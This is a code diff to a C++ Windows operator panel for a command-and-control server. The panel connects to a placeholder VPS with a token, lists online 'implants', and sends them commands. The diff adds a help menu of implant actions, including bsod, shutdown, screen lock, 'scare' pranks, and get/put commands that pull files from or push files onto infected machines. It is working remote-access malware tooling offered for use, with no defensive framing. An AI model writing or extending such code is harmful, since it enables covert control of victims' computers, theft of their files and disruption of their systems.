@@ -1,4 +1,3 @@
-// language: C++, file: panel.cpp, target: Windows x64, MinGW
 #define NOMINMAX
 #include <windows.h>
 #include <winhttp.h>
@@ -77,12 +76,16 @@ static std::vector<std::string> ListImplants(const std::string& json) {
 }
 
 int main() {
-    // ПРАВЬ ЗДЕСЬ — впиши свой VPS и токен
     std::wstring HOST  = L"your-vps.example.net";
     int          PORT  = 8080;
     std::wstring TOKEN = L"CHANGE_ME_LONG_RANDOM";
 
-    std::cout << "panel v1 — commands: list, use <id>, send <cmd>, results, exit\n\n";
+    std::cout << "=== panel v1 ===\n";
+    std::cout << "commands: list, use <id>, send <cmd>, results, exit\n";
+    std::cout << "special: screen_off screen_on lock beep mute vol_max vol_0 vol_50\n";
+    std::cout << "         msg <text> shutdown restart cancel scare wall party\n";
+    std::cout << "         bsod flip flip_reset cursor_hide cursor_show open <path>\n";
+    std::cout << "         get <path>  put <path> <b64>\n\n";
 
     std::string active, line;
     while (true) {
@@ -94,6 +97,23 @@ int main() {
             auto ids = ListImplants(HttpGet(HOST, PORT, TOKEN, L"/panel/implants"));
             if (ids.empty()) std::cout << "(no implants online)\n";
             else for (auto& id : ids) std::cout << "  " << id << "\n";
+        }
+        else if (line == "help") {
+            std::cout << "commands:\n"
+                      << "  list                - show online implants\n"
+                      << "  use <id>            - select implant\n"
+                      << "  send <cmd>          - send command\n"
+                      << "  results             - get output\n"
+                      << "  exit                - quit\n\n"
+                      << "special commands (send ...):\n"
+                      << "  screen_off screen_on lock beep\n"
+                      << "  mute vol_max vol_0 vol_50\n"
+                      << "  msg <text>  open <path>\n"
+                      << "  scare  wall  party\n"
+                      << "  bsod  flip  flip_reset\n"
+                      << "  cursor_hide  cursor_show\n"
+                      << "  shutdown  restart  cancel\n"
+                      << "  get <path>  put <path> <b64>\n";
         }
         else if (line.rfind("use ", 0) == 0) {
             active = line.substr(4);
@@ -111,7 +131,7 @@ int main() {
             std::cout << HttpGet(HOST, PORT, TOKEN,
                                  L"/panel/results/" + Widen(active)) << "\n";
         }
-        else std::cout << "commands: list, use <id>, send <cmd>, results, exit\n";
+        else std::cout << "unknown. type 'help' for commands\n";
     }
     return 0;
 }
